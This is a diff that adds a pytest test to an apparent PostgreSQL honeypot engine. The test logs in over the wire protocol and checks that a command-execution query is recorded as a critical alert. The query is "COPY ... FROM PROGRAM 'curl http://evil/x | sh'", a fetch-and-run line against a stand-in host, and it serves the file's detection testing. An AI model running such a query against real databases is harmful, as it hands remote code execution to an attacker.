@@ -146,6 +146,46 @@ async def test_postgresql_captures_password():
     assert p["service"] == "postgresql"
 
 
+@pytest.mark.asyncio
+async def test_postgresql_captures_copy_from_program_rce():
+    """After login is accepted, a `COPY ... FROM PROGRAM` (superuser command
+    execution) must be captured as CRITICAL postgresql_copy_program_rce."""
+    from honeypot_mcp.engines.postgresql import PostgreSQLEngine
+    from honeypot_mcp.storage.models import HoneypotType
+
+    port = await _register("pg-rce", HoneypotType.POSTGRESQL)
+    engine = PostgreSQLEngine()
+    cid = await engine.start("pg-rce", port, {})
+    try:
+        reader, writer = await asyncio.open_connection("127.0.0.1", port)
+        try:
+            body = struct.pack("!I", 196608) + b"user\x00postgres\x00database\x00postgres\x00\x00"
+            writer.write(struct.pack("!I", len(body) + 4) + body)
+            await writer.drain()
+            await asyncio.wait_for(reader.read(64), timeout=3.0)  # auth request
+            pw = b"x\x00"
+            writer.write(b"p" + struct.pack("!I", len(pw) + 4) + pw)
+            await writer.drain()
+            await asyncio.wait_for(reader.read(512), timeout=3.0)  # post-auth preamble
+            # Now issue the RCE query.
+            q = b"COPY t FROM PROGRAM 'curl http://evil/x | sh'\x00"
+            writer.write(b"Q" + struct.pack("!I", len(q) + 4) + q)
+            await writer.drain()
+            await asyncio.sleep(0.3)
+        finally:
+            writer.close()
+            with contextlib.suppress(Exception):
+                await writer.wait_closed()
+        await asyncio.sleep(1.2)
+    finally:
+        await engine.stop(cid)
+
+    events = await _alerts_of_type("postgresql_copy_program_rce")
+    assert len(events) == 1
+    assert events[0].severity.value == "critical"
+    assert "from program" in events[0].payload["query"].lower()
+
+
 # ── MongoDB ───────────────────────────────────────────────────────────────────
 
 
